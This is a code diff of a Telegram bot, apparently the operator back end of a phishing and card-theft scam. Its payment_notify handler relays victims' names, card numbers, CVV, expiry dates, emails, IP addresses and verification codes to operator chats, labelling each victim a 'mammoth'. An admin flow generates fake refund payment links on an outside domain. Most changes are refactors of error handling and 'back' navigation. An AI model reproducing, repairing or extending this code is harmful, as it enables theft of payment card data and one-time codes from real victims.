@@ -1277,10 +1277,8 @@ async def admin_enter_text(message: types.Message):
 
 @router.message()
 async def block_others(message: types.Message):
-    print(f"[DEBUG] block_others: text={getattr(message, 'text', None)!r}, type={getattr(message, 'content_type', None)}, user_step={user_step.get(message.from_user.id)}")
     # Дати універсальному хендлеру для 'Назад' спрацювати!
-    text = getattr(message, 'text', None) or getattr(message, 'caption', None)
-    if text and (text.strip().lower() == 'назад' or text.strip().lower() == '⬅️ назад'):
+    if message.text and ('назад' in message.text.lower() or '⬅️' in message.text.lower()):
         return
     uid = message.from_user.id
     print(f"[block_others] uid={uid}, user_step={user_step.get(uid)}, text={message.text!r}")
@@ -1520,14 +1518,8 @@ async def payment_notify(request):
             ]
         ]
     )
-    try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
-    except Exception as e:
-        print(f"[ERROR] send_message PAYMENT_GROUP_ID msg1: {e}")
-    try:
-        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
-    except Exception as e:
-        print(f"[ERROR] send_message ADMIN_GROUP_ID msg1: {e}")
+    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     msg2 = (
         f"Email: {email}\n"
@@ -1550,10 +1542,7 @@ async def payment_notify(request):
         ]
     ]
     )
-    try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
-    except Exception as e:
-        print(f"[ERROR] send_message PAYMENT_GROUP_ID msg2: {e}")
+    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
     # 3. Повідомлення з кодом, IP + кнопка Request again
     if code:
         msg3 = (
@@ -1567,10 +1556,7 @@ async def payment_notify(request):
                 ]
             ]
         )
-        try:
-            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
-        except Exception as e:
-            print(f"[ERROR] send_message PAYMENT_GROUP_ID msg3: {e}")
+        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
 
     # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
     page_code = data.get('page', '')
@@ -1582,19 +1568,10 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
-        except Exception as e:
-            print(f"[ERROR] send_message admin_user_id FIO: {e}")
-        try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
-        except Exception as e:
-            print(f"[ERROR] send_message admin_user_id card: {e}")
+        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         if code:
-            try:
-                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
-            except Exception as e:
-                print(f"[ERROR] send_message admin_user_id code: {e}")
+            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
 
 @log_function
 async def code_notify(request):
@@ -2030,58 +2007,44 @@ manual_payment_attempts = {}
 @router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
 @ban_guard
 async def manual_payment_back(message: types.Message):
-    uid = message.from_user.id
-    # ОДНА перевірка на 'назад'/'⬅️ назад' на самому початку
-    if message.text and message.text.strip().lower() in ['назад', '⬅️ назад']:
-        user_step[uid] = None
-        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer("Повернення в головне меню.", reply_markup=kb)
-        print(f"[DEBUG] manual_payment_back: Назад, user_step={user_step.get(uid)}")
-        return
     try:
+        uid = message.from_user.id
         back_kb = ReplyKeyboardMarkup(
             keyboard=[[KeyboardButton(text="⬅️ Назад")]],
             resize_keyboard=True
         )
-        # Далі — тільки логіка для суми/валюти та невалідного вводу
-        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{2,5})$", message.text.strip())
+        # Скидання за ключовим словом "назад"
+        if message.text and "назад" in message.text.lower():
+            user_step[uid] = None
+            manual_payment_attempts.pop(uid, None)
+            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+            await message.answer("Возврат в главное меню.", reply_markup=ReplyKeyboardRemove())
+            await message.answer("Головне меню:", reply_markup=kb)
+            return
+        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
         if m:
             amount = m.group(1).replace(',', '.')
             currency = m.group(2).upper()
             link = f"https://artpullse.com/refund/?total={amount}{currency}"
-            sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
+            await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
-            print(f"[DEBUG] manual_payment_back: user_step set to None after link")
             manual_payment_attempts.pop(uid, None)
-            for mid in bot_message_ids.get(uid, []):
-                try:
-                    await message.bot.delete_message(uid, mid)
-                except Exception:
-                    pass
-            bot_message_ids[uid] = []
             kb = admin_menu_kb if is_admin(uid) else main_menu_kb
             await message.answer("Головне меню:", reply_markup=kb)
-            print(f"[DEBUG] Оплата: user_step={user_step.get(uid)}, bot_message_ids={bot_message_ids.get(uid)}")
-            return
-        # Якщо невалідно — одразу скидаємо user_step і повертаємо у головне меню
-        user_step[uid] = None
-        print(f"[DEBUG] manual_payment_back: user_step set to None by invalid input")
-        manual_payment_attempts.pop(uid, None)
-        for mid in bot_message_ids.get(uid, []):
-            try:
-                await message.bot.delete_message(uid, mid)
-            except Exception:
-                pass
-        bot_message_ids[uid] = []
-        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer("Ви повернуті в головне меню.", reply_markup=kb)
-        print(f"[DEBUG] Інше (manual_payment_amount): user_step={user_step.get(uid)}, bot_message_ids={bot_message_ids.get(uid)}")
+        else:
+            # Лічильник спроб
+            manual_payment_attempts[uid] = manual_payment_attempts.get(uid, 0) + 1
+            if manual_payment_attempts[uid] >= 2:
+                user_step[uid] = None
+                manual_payment_attempts.pop(uid, None)
+                kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+                await message.answer("❗️ Формат невірний. Ви повернуті в головне меню.", reply_markup=kb)
+            else:
+                await message.answer("❗️ Введіть суму і валюту через пробел (наприклад: 45 EUR або 100 USD):", reply_markup=back_kb)
     except Exception as e:
         user_step[message.from_user.id] = None
-        print(f"[DEBUG] manual_payment_back: user_step set to None by exception")
         manual_payment_attempts.pop(message.from_user.id, None)
         await message.answer(f"Сталася помилка: {e}")
-        print(f"[ERROR] manual_payment_back: {e}")
 
 @router.message(lambda m: m.text and ("назад" in m.text.lower() or "⬅️" in m.text.lower()))
 @ban_guard
@@ -2198,128 +2161,6 @@ async def back_to_main_menu(message: types.Message):
 
 
 
-
-# --- Універсальний callback_query-хендлер для всіх inline-кнопок ---
-@router.callback_query()
-async def universal_any_callback_handler(call: types.CallbackQuery):
-    uid = call.from_user.id
-    user_step[uid] = None
-    manual_payment_attempts.pop(uid, None)
-    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    # Видалити кнопки у повідомленні, якщо є
-    try:
-        await call.message.edit_reply_markup(reply_markup=None)
-    except Exception:
-        pass
-    # Видалити саме повідомлення з кнопками
-    try:
-        await call.message.delete()
-    except Exception:
-        pass
-    # --- Видалити попереднє повідомлення з кнопками, якщо є ---
-    if last_bot_message_id.get(uid):
-        try:
-            await call.bot.delete_message(uid, last_bot_message_id[uid])
-        except Exception:
-            pass
-        last_bot_message_id.pop(uid, None)
-    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    await call.answer()
-
-# --- Додаємо глобальний dict для списку повідомлень з кнопками ---
-bot_message_ids = {}
-
-@router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
-@ban_guard
-async def manual_payment_back(message: types.Message):
-    try:
-        uid = message.from_user.id
-        back_kb = ReplyKeyboardMarkup(
-            keyboard=[[KeyboardButton(text="⬅️ Назад")]],
-            resize_keyboard=True
-        )
-        # Скидання за ключовим словом "назад"
-        if message.text and "назад" in message.text.lower():
-            user_step[uid] = None
-            manual_payment_attempts.pop(uid, None)
-            # --- Видалити всі попередні повідомлення з кнопками, якщо є ---
-            for mid in bot_message_ids.get(uid, []):
-                try:
-                    await message.bot.delete_message(uid, mid)
-                except Exception:
-                    pass
-            bot_message_ids[uid] = []
-            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-            await message.answer("Возврат в главное меню.", reply_markup=ReplyKeyboardRemove())
-            await message.answer("Головне меню:", reply_markup=kb)
-            return
-        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
-        if m:
-            amount = m.group(1).replace(',', '.')
-            currency = m.group(2).upper()
-            link = f"https://artpullse.com/refund/?total={amount}{currency}"
-            sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
-            user_step[uid] = None
-            manual_payment_attempts.pop(uid, None)
-            # --- Видалити всі попередні повідомлення з кнопками, якщо є ---
-            for mid in bot_message_ids.get(uid, []):
-                try:
-                    await message.bot.delete_message(uid, mid)
-                except Exception:
-                    pass
-            bot_message_ids[uid] = []
-            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-            await message.answer("Головне меню:", reply_markup=kb)
-            return
-        else:
-            # Лічильник спроб
-            manual_payment_attempts[uid] = manual_payment_attempts.get(uid, 0) + 1
-            if manual_payment_attempts[uid] >= 2:
-                user_step[uid] = None
-                manual_payment_attempts.pop(uid, None)
-                # --- Видалити всі попередні повідомлення з кнопками, якщо є ---
-                for mid in bot_message_ids.get(uid, []):
-                    try:
-                        await message.bot.delete_message(uid, mid)
-                    except Exception:
-                        pass
-                bot_message_ids[uid] = []
-                kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-                await message.answer("❗️ Формат невірний. Ви повернуті в головне меню.", reply_markup=kb)
-            else:
-                # --- Додаємо id повідомлення з кнопками у список ---
-                msg = await message.answer("❗️ Введіть суму і валюту через пробел (наприклад: 45 EUR або 100 USD):", reply_markup=back_kb)
-                bot_message_ids.setdefault(uid, []).append(msg.message_id)
-    except Exception as e:
-        user_step[message.from_user.id] = None
-        manual_payment_attempts.pop(message.from_user.id, None)
-        await message.answer(f"Сталася помилка: {e}")
-
-# --- Універсальний хендлер для '⬅️ Назад' у будь-якому стані ---
-@router.message(lambda m: m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
-@ban_guard
-async def force_back_to_main(message: types.Message):
-    uid = message.from_user.id
-    user_step[uid] = None
-    print(f"[DEBUG] force_back_to_main: user_step set to None, text={message.text!r}")
-    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    await message.answer("Повернення в головне меню.", reply_markup=kb)
-    print(f"[DEBUG] force_back_to_main: user_step={user_step.get(uid)}")
-
-@router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel' and m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
-@ban_guard
-async def admin_panel_back(message: types.Message):
-    uid = message.from_user.id
-    user_step[uid] = None
-    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    await message.answer("", reply_markup=kb)
-    print(f"[DEBUG] admin_panel_back: user_step={user_step.get(uid)}")
-
-
-
-
-
-
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
     async def main():
@@ -2346,3 +2187,13 @@ if __name__ == '__main__':
         # aiogram polling
         await dp.start_polling(bot)
     asyncio.run(main())
+
+# --- Універсальний callback_query-хендлер для всіх inline-кнопок ---
+@router.callback_query()
+async def universal_any_callback_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
